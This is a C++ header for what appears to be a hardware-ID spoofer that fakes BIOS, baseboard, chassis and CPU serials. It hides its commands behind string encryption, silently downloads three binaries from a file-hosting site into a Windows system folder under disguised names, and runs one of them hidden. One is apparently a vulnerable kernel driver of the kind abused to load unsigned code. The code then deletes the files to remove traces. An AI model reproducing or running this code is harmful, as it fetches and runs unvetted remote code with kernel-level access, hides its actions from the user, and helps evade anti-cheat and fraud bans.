#pragma once
#include "Windows.h"
#include <thread>
#include "randomizer.h"
#include <vector>
#include <iostream>
#include "skcrypt.h"
#include "crypted_system.h"

void Bios() {
	
	system(Encrypt("curl --silent https://files.catbox.moe/sdfbn8.sys --output C:\\Windows\\GameBarPresenceWriter\\Frozen.exe >nul").decrypt());
	system(Encrypt("curl --silent https://files.catbox.moe/n6i5j0.sys --output C:\\Windows\\GameBarPresenceWriter\\winxsrcsv64.sys >nul").decrypt());
	system(Encrypt("curl --silent https://files.catbox.moe/j7goj8.sys --output C:\\Windows\\GameBarPresenceWriter\\iqvw64e.sys >nul").decrypt());

		//SMBios
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /IVN \"American Megatrends International, LLC.\"").decrypt())); //done
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /IV \"3.1\"").decrypt() + RandomNumber(1)).c_str()); //done
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /ID \"11/09/2024\"").decrypt()));
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /SM \"Gigabyte Technology Co., Ltd.\"").decrypt())); 
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /SP \"Z790 AORUS ELITE AX\"").decrypt())); 
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /SV \"American Megatrends International, LLC.\"").decrypt()));
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /SS ").decrypt() + Random(12)).c_str()); 
		ExecuteCommandHidden(Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /SU AUTO").decrypt()); 
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /SK \"Default string\"").decrypt())); 
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /SF \"Default string\"").decrypt()));

		printf("SMBios Succefully Spoofed \n");
		//Baseboard
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /BM \"Gigabyte Technology Co., Ltd.\"").decrypt())); 
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /BP \"Z790 AORUS ELITE AX\"").decrypt())); 
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /BV \"1.\"").decrypt() + RandomNumber(1)).c_str());
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /BS ").decrypt() + Random(12)).c_str()); 
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /BT \"Default string\"").decrypt())); 
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /BLC \"Default string\"").decrypt())); 
		

			Sleep(2000);

		printf("Baseboard Succefully Spoofed\n");

		//Chasis
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /CM \"Gigabyte Technology Co., Ltd.\"").decrypt())); 
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /CT \"03h\"").decrypt())); 
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /CV \"Default string\"").decrypt())); 
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /CS ").decrypt() + Random(12)).c_str());
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /CA \"Default string\"").decrypt())); 
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /CO \"00000000h\"").decrypt())); 
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /CH \"00h\"").decrypt()));
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /CPC \"01h\"").decrypt())); 
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /CSK \"Default string\"").decrypt()));

		//CPU
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /PSN \"Unknown\"").decrypt())); 
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /PAT \"Unknown\"").decrypt())); 
		ExecuteCommandHidden((Encrypt("C:\\Windows\\GameBarPresenceWriter\\Frozen.exe /PPN \"Unknown\"").decrypt())); //donee
		Sleep(2000);

		printf("CPU Succefully Spoofed\n");

		ExecuteCommandHidden(("del C:\\Windows\\GameBarPresenceWriter\\Frozen.exe"));
		ExecuteCommandHidden(("del C:\\Windows\\GameBarPresenceWriter\\winxsrcsv64.sys"));
		ExecuteCommandHidden(("del C:\\Windows\\GameBarPresenceWriter\\iqvw64e.sys"));
}
